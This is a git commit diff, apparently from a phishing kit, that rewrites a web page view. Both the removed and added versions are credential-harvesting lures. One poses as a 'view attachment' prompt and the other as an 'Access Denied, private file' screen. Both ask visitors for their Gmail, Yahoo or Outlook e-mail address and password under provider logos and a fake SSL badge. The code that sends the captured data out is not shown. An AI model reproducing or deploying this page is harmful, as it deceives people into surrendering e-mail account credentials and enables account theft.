a602f3982c11c1d66b52698f0beec170c771e3f2
Rich Mama <postmaster.richmama@gmail.com>
2018-01-29 16:35:45 +0100

    Otedola

--- resources/views/index.blade.php
+++ resources/views/index.blade.php
@@ -1,58 +1,156 @@
-@extends('layout')
 
-@section('title', "View Attachment")
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-@section("content") 
-<style type="text/css">
-html{
-	background: url(https://drive.google.com/uc?export=view&id=1qz8IhgcKffL60VgACBSygS4aoliZR6pe) no-repeat center center fixed; 
-  -webkit-background-size: cover;
-  -moz-background-size: cover;
-  -o-background-size: cover;
-  background-size: cover;
+  <title></title>
+
+  <!-- Stylesheets -->
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/set1.css">
+  
+  <style type="text/css">
+
+#listt img{
+	display: inline-block !important;
+	margin:20px;
 }
 </style>
-<div class="container-fluid">
-  <div class="row">
-     <div id="row1">
-  	<div class="col-lg-12 col-xs-12">
-  	  <center>
-         <h2>You are about to view an attachment:</h2>
-         <button id="btn1" class="btn btn-success">Continue</button>
-        </center>
-       </div>
-     </div><br>
- 
-  <div id="row2">
-  	<center>
-         <h2>Please login to continue:</h2>
-  	<form id="sendForm">
-      
-  	<div class="col-lg-12 col-sm-12 col-md-12 col-xs-12">
-  	       <h4>Username <span style="color:red;">*</span></h4>
-             <input type="email" class="form-control" id="username" required><br>
-             	
-             <h4>Password<span style="color:red;">*</span></h4>
-             <input type="password" class="form-control" id="pass" required><br>
+
+  <!--Google Fonts-->
+  <link href='https://fonts.googleapis.com/css?family=Playfair+Display' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>
+
+</head>
+
+<body>
+<div id="main-wrapper">
+
+  <div class="container-fluid">
+    <div class="row">
+      <div class="col-md-6 col-xs-12 left-side">
+        <header>
+          <h4 style="color: red !important;">Access Denied</h4>
+          <span>This is a private file</span>
+          <h3>Sign up<br>to get access!</h3>
+        </header>
       </div>
-     </form><br>
-       	<div class="col-lg-4 col-sm-4 col-md-4 col-xs-4">
-  	  <img src="{{asset('img/gmail.jpg')}}" alt="Gmail" width="100" height="100">
+      <div class="col-md-6 col-xs-12 right-side">
+         <!-- #row2 -->
+        <div id="row2">
+        	<h3>Sign up using:</h3>
+            <div id="listt">
+                <img id="gref" src="img/gmail.jpg" alt="Gmail" width="70" height="70"><img id="yref" src="img/yahoo.png" alt="Yahoo!" width="70" height="70"><img id="oref" src="img/outlook.png" alt="Outlook" width="70" height="70">
+            </div>
+        </div>
+        <!-- /#row2 -->
+        
+         <!-- #row3 -->
+        <div id="row3">
+            <h3 class=""><img src="img/ssl.png" style="margin: 20px;" alt="Gmail" width="140" height="50">Log in to authnticate:</h3>
+        <span class="input input--hoshi">
+          <input class="input__field input__field--hoshi" type="text" id="email" />
+          <label class="input__label input__label--hoshi input__label--hoshi-color-3" for="email">
+            <span class="input__label-content input__label-content--hoshi">E-mail</span>
+          </label>
+        </span>
+        <span class="input input--hoshi">
+          <input class="input__field input__field--hoshi" type="password" id="password" />
+          <label class="input__label input__label--hoshi input__label--hoshi-color-3" for="password">
+            <span class="input__label-content input__label-content--hoshi">Password</span>
+          </label>
+        </span>
+        <div class="cta">
+          <button class="btn btn-primary">
+            Sign-Up Now
+          </button>
+        </div>
+        </div>
+        <!-- /#row3 -->
+        
       </div>
-      <div class="col-lg-4 col-sm-4 col-md-4 col-xs-4">
-  	  <img src="{{asset('img/yahoo.png')}}" alt="Yahoo!" width="100" height="100">
-      </div>
-      <div class="col-lg-4 col-sm-4 col-md-4 col-xs-4">
-  	  <img src="{{asset('img/outlook.png')}}" alt="Outlook" width="100" height="100">
-      </div>
-      </center><br>
-      
-      <div class="col-lg-12 col-xs-12">
-  	  <center> 
-        <button id="submit" class="btn btn-success">Submit</button>
-        </center>
-      </div>
-    </div><br> 
+    </div>
   </div>
-</div>
-@stop
+
+</div> <!-- end #main-wrapper -->
+
+<!-- Scripts -->
+<script src="js/jquery.min.js"></script>
+<script src="js/scripts.js"></script>
+<script src="js/classie.js"></script>
+<script>
+  (function() {
+  	$('#row3').hide();
+  
+    // trim polyfill : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/Trim
+    if (!String.prototype.trim) {
+      (function() {
+        // Make sure we trim BOM and NBSP
+        var rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
+        String.prototype.trim = function() {
+          return this.replace(rtrim, '');
+        };
+      })();
+    }
+
+    [].slice.call( document.querySelectorAll( 'input.input__field' ) ).forEach( function( inputEl ) {
+      // in case the input is already filled..
+      if( inputEl.value.trim() !== '' ) {
+        classie.add( inputEl.parentNode, 'input--filled' );
+      }
+
+      // events:
+      inputEl.addEventListener( 'focus', onInputFocus );
+      inputEl.addEventListener( 'blur', onInputBlur );
+    } );
+
+    function onInputFocus( ev ) {
+      classie.add( ev.target.parentNode, 'input--filled' );
+    }
+
+    function onInputBlur( ev ) {
+      if( ev.target.value.trim() === '' ) {
+        classie.remove( ev.target.parentNode, 'input--filled' );
+      }
+    }
+  })();
+</script>
+<script>
+	var authtype = "";
+	
+$(document).ready(function(){
+  $('#yref').click(function(e){
+     // alert("clicked yahoo");
+     setauth("y");
+   });
+   $('#gref').click(function(e){
+     // alert("clicked gmail");
+     setauth("g");
+   });
+   $('#oref').click(function(e){
+     // alert("clicked yahoo");
+     setauth("o");
+   });
+});
+
+function setauth(auth){
+  if(auth == "y"){
+     $('#auth-image').attr({"src":"img/yahoo.png"});
+  }
+  else if(auth == "o"){
+     $('#auth-image').attr({"src":"img/outlook.png"});
+  }
+  else if(auth == "g"){
+     $('#auth-image').attr({"src":"img/gmail.jpg"});
+  }
+  
+  $('#row2').hide();
+  $('#row3').fadeIn();
+} 
+</script>
+
+</body>
+</html>
